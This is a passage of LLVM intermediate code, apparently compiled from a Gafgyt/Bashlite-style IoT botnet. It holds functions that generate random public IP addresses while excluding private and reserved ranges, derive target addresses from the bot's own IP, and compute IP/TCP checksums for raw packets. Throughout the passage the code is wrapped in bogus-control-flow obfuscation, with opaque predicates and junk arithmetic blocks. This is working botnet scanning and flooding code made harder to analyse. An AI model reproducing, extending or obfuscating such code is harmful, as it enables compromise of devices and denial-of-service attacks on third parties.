  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %153, label %162, label %182

; <label>:162:                                    ; preds = %originalBBpart220
  %163 = load i32, i32* @x.59
  %164 = load i32, i32* @y.60
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %162
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 2
  %174 = load i32, i32* @x.59
  %175 = load i32, i32* @y.60
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %173, label %338, label %182

; <label>:182:                                    ; preds = %originalBBpart224, %originalBBpart220, %138
  %183 = load i32, i32* @x.59
  %184 = load i32, i32* @y.60
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %182
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 192
  %194 = load i32, i32* @x.59
  %195 = load i32, i32* @y.60
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %193, label %202, label %242

; <label>:202:                                    ; preds = %originalBBpart228
  %203 = load i32, i32* @x.59
  %204 = load i32, i32* @y.60
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %202
  %211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 88
  %214 = load i32, i32* @x.59
  %215 = load i32, i32* @y.60
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %213, label %222, label %242

; <label>:222:                                    ; preds = %originalBBpart232
  %223 = load i32, i32* @x.59
  %224 = load i32, i32* @y.60
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %222
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 99
  %234 = load i32, i32* @x.59
  %235 = load i32, i32* @y.60
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %233, label %338, label %242

; <label>:242:                                    ; preds = %originalBBpart236, %originalBBpart232, %originalBBpart228
  %243 = load i32, i32* @x.59
  %244 = load i32, i32* @y.60
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %242
  %251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 192
  %254 = load i32, i32* @x.59
  %255 = load i32, i32* @y.60
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %253, label %262, label %266

; <label>:262:                                    ; preds = %originalBBpart240
  %263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 168
  br i1 %265, label %338, label %266

; <label>:266:                                    ; preds = %262, %originalBBpart240
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 198
  br i1 %269, label %270, label %278

; <label>:270:                                    ; preds = %266
  %271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %272 = zext i8 %271 to i32
  %273 = icmp eq i32 %272, 18
  br i1 %273, label %338, label %274

; <label>:274:                                    ; preds = %270
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 19
  br i1 %277, label %338, label %278

; <label>:278:                                    ; preds = %274, %266
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 198
  br i1 %281, label %282, label %322

; <label>:282:                                    ; preds = %278
  %283 = load i32, i32* @x.59
  %284 = load i32, i32* @y.60
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %282
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 51
  %294 = load i32, i32* @x.59
  %295 = load i32, i32* @y.60
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %293, label %302, label %322

; <label>:302:                                    ; preds = %originalBBpart244
  %303 = load i32, i32* @x.59
  %304 = load i32, i32* @y.60
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %302
  %311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %312 = zext i8 %311 to i32
  %313 = icmp eq i32 %312, 100
  %314 = load i32, i32* @x.59
  %315 = load i32, i32* @y.60
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %313, label %338, label %322

; <label>:322:                                    ; preds = %originalBBpart248, %originalBBpart244, %278
  %323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 203
  br i1 %325, label %326, label %334

; <label>:326:                                    ; preds = %322
  %327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %328 = zext i8 %327 to i32
  %329 = icmp eq i32 %328, 0
  br i1 %329, label %330, label %334

; <label>:330:                                    ; preds = %326
  %331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %332 = zext i8 %331 to i32
  %333 = icmp eq i32 %332, 113
  br i1 %333, label %338, label %334

; <label>:334:                                    ; preds = %330, %326, %322
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp sge i32 %336, 224
  br label %338

; <label>:338:                                    ; preds = %334, %330, %originalBBpart248, %274, %270, %262, %originalBBpart236, %originalBBpart224, %134, %90, %66, %originalBBpart24, %18, %14
  %339 = phi i1 [ true, %330 ], [ true, %originalBBpart248 ], [ true, %274 ], [ true, %270 ], [ true, %262 ], [ true, %originalBBpart236 ], [ true, %originalBBpart224 ], [ true, %134 ], [ true, %90 ], [ true, %66 ], [ true, %originalBBpart24 ], [ true, %18 ], [ true, %14 ], [ %337, %334 ]
  br i1 %339, label %340, label %369

; <label>:340:                                    ; preds = %338
  %341 = load i32, i32* @x.59
  %342 = load i32, i32* @y.60
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %340
  %349 = call i32 @rand() #5
  %350 = srem i32 %349, 223
  %351 = trunc i32 %350 to i8
  store i8 %351, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %352 = call i32 @rand() #5
  %353 = srem i32 %352, 255
  %354 = trunc i32 %353 to i8
  store i8 %354, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %355 = call i32 @rand() #5
  %356 = srem i32 %355, 255
  %357 = trunc i32 %356 to i8
  store i8 %357, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %358 = call i32 @rand() #5
  %359 = srem i32 %358, 255
  %360 = trunc i32 %359 to i8
  store i8 %360, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %361 = load i32, i32* @x.59
  %362 = load i32, i32* @y.60
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart267, label %originalBB50alteredBB

originalBBpart267:                                ; preds = %originalBB50
  br label %14

; <label>:369:                                    ; preds = %338
  %370 = load i32, i32* @x.59
  %371 = load i32, i32* @y.60
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %369
  %378 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %378, i8 0, i64 16, i32 16, i1 false)
  %379 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %381 = zext i8 %380 to i32
  %382 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %383 = zext i8 %382 to i32
  %384 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %385 = zext i8 %384 to i32
  %386 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %387 = zext i8 %386 to i32
  %388 = call i32 (i8*, i8*, ...) @szprintf(i8* %379, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.263, i32 0, i32 0), i32 %381, i32 %383, i32 %385, i32 %387)
  %389 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %390 = call i32 @inet_addr(i8* %389) #5
  %391 = load i32, i32* @x.59
  %392 = load i32, i32* @y.60
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  ret i32 %390

originalBBalteredBB:                              ; preds = %originalBB, %26
  %399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %400 = zext i8 %399 to i32
  %401 = icmp sge i32 %400, 64
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %402 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %403 = zext i8 %402 to i32
  %404 = icmp sle i32 %403, 127
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 169
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %94
  %408 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 172
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %114
  %411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %412 = zext i8 %411 to i32
  %413 = icmp sle i32 %412, 16
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  %414 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %162
  %417 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %418 = zext i8 %417 to i32
  %419 = icmp eq i32 %418, 2
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %182
  %420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 192
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %202
  %423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 88
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %222
  %426 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %427 = zext i8 %426 to i32
  %428 = icmp eq i32 %427, 99
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %242
  %429 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 192
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %282
  %432 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 51
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %302
  %435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %436 = zext i8 %435 to i32
  %437 = icmp eq i32 %436, 100
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %340
  %438 = call i32 @rand() #5
  %_ = shl i32 %438, 223
  %_51 = shl i32 %438, 223
  %_52 = shl i32 %438, 223
  %_53 = shl i32 %438, 223
  %439 = srem i32 %438, 223
  %440 = trunc i32 %439 to i8
  store i8 %440, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %441 = call i32 @rand() #5
  %_54 = shl i32 %441, 255
  %_55 = shl i32 %441, 255
  %442 = srem i32 %441, 255
  %443 = trunc i32 %442 to i8
  store i8 %443, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %444 = call i32 @rand() #5
  %_56 = sub i32 %444, 255
  %gen = mul i32 %_56, 255
  %445 = srem i32 %444, 255
  %446 = trunc i32 %445 to i8
  store i8 %446, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %447 = call i32 @rand() #5
  %_57 = shl i32 %447, 255
  %_58 = sub i32 0, %447
  %gen59 = add i32 %_58, 255
  %_60 = shl i32 %447, 255
  %_61 = sub i32 0, %447
  %gen62 = add i32 %_61, 255
  %_63 = shl i32 %447, 255
  %_64 = sub i32 0, %447
  %gen65 = add i32 %_64, 255
  %448 = srem i32 %447, 255
  %449 = trunc i32 %448 to i8
  store i8 %449, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %originalBB50

originalBB69alteredBB:                            ; preds = %originalBB69, %369
  %450 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %450, i8 0, i64 16, i32 16, i1 false)
  %451 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %452 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %453 = zext i8 %452 to i32
  %454 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %455 = zext i8 %454 to i32
  %456 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %457 = zext i8 %456 to i32
  %458 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %459 = zext i8 %458 to i32
  %460 = call i32 (i8*, i8*, ...) @szprintf(i8* %451, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.263, i32 0, i32 0), i32 %453, i32 %455, i32 %457, i32 %459)
  %461 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %462 = call i32 @inet_addr(i8* %461) #5
  br label %originalBB69
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.61
  %3 = load i32, i32* @y.62
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #10
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.61
  %23 = load i32, i32* @y.62
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #10
  %34 = load i32, i32* %30, align 4
  %_ = shl i32 %33, %34
  %_1 = sub i32 %33, %34
  %gen = mul i32 %_1, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_2 = sub i32 0, %38
  %gen3 = add i32 %_2, -1
  %_4 = sub i32 %38, -1
  %gen5 = mul i32 %_4, -1
  %39 = xor i32 %38, -1
  %_6 = sub i32 0, %37
  %gen7 = add i32 %_6, %39
  %_8 = sub i32 %37, %39
  %gen9 = mul i32 %_8, %39
  %_10 = sub i32 %37, %39
  %gen11 = mul i32 %_10, %39
  %40 = and i32 %37, %39
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %34

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* @x.63
  %11 = load i32, i32* @y.64
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i16*, i16** %3, align 8
  %19 = getelementptr inbounds i16, i16* %18, i32 1
  store i16* %19, i16** %3, align 8
  %20 = load i16, i16* %18, align 2
  %21 = zext i16 %20 to i64
  %22 = load i64, i64* %5, align 8
  %23 = add i64 %22, %21
  store i64 %23, i64* %5, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sub nsw i32 %24, 2
  store i32 %25, i32* %4, align 4
  %26 = load i32, i32* @x.63
  %27 = load i32, i32* @y.64
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:34:                                     ; preds = %6
  %35 = load i32, i32* @x.63
  %36 = load i32, i32* @y.64
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = icmp sgt i32 %43, 0
  %45 = load i32, i32* @x.63
  %46 = load i32, i32* @y.64
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %44, label %53, label %60

; <label>:53:                                     ; preds = %originalBBpart233
  %54 = load i16*, i16** %3, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %5, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %5, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %originalBBpart233
  %61 = load i32, i32* @x.63
  %62 = load i32, i32* @y.64
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %60
  %69 = load i32, i32* @x.63
  %70 = load i32, i32* @y.64
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %77

; <label>:77:                                     ; preds = %81, %originalBBpart237
  %78 = load i64, i64* %5, align 8
  %79 = lshr i64 %78, 16
  %80 = icmp ne i64 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i64, i64* %5, align 8
  %83 = and i64 %82, 65535
  %84 = load i64, i64* %5, align 8
  %85 = lshr i64 %84, 16
  %86 = add i64 %83, %85
  store i64 %86, i64* %5, align 8
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i64, i64* %5, align 8
  %89 = xor i64 %88, -1
  %90 = trunc i64 %89 to i16
  ret i16 %90

originalBBalteredBB:                              ; preds = %originalBB, %9
  %91 = load i16*, i16** %3, align 8
  %92 = getelementptr inbounds i16, i16* %91, i32 1
  store i16* %92, i16** %3, align 8
  %93 = load i16, i16* %91, align 2
  %94 = zext i16 %93 to i64
  %95 = load i64, i64* %5, align 8
  %_ = sub i64 0, %95
  %gen = add i64 %_, %94
  %_1 = shl i64 %95, %94
  %_2 = sub i64 0, %95
  %gen3 = add i64 %_2, %94
  %_4 = sub i64 %95, %94
  %gen5 = mul i64 %_4, %94
  %_6 = sub i64 %95, %94
  %gen7 = mul i64 %_6, %94
  %_8 = sub i64 0, %95
  %gen9 = add i64 %_8, %94
  %_10 = shl i64 %95, %94
  %_11 = sub i64 0, %95
  %gen12 = add i64 %_11, %94
  %_13 = sub i64 0, %95
  %gen14 = add i64 %_13, %94
  %96 = add i64 %95, %94
  store i64 %96, i64* %5, align 8
  %97 = load i32, i32* %4, align 4
  %_15 = sub i32 %97, 2
  %gen16 = mul i32 %_15, 2
  %_17 = shl i32 %97, 2
  %_18 = sub i32 0, %97
  %gen19 = add i32 %_18, 2
  %_20 = sub i32 %97, 2
  %gen21 = mul i32 %_20, 2
  %_22 = sub i32 %97, 2
  %gen23 = mul i32 %_22, 2
  %_24 = sub i32 0, %97
  %gen25 = add i32 %_24, 2
  %_26 = sub i32 %97, 2
  %gen27 = mul i32 %_26, 2
  %_28 = sub i32 %97, 2
  %gen29 = mul i32 %_28, 2
  %_30 = shl i32 %97, 2
  %98 = sub nsw i32 %97, 2
  store i32 %98, i32* %4, align 4
  br label %originalBB

originalBB31alteredBB:                            ; preds = %originalBB31, %34
  %99 = load i32, i32* %4, align 4
  %100 = icmp sgt i32 %99, 0
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %60
  br label %originalBB35
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.65
  %4 = load i32, i32* @y.66
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
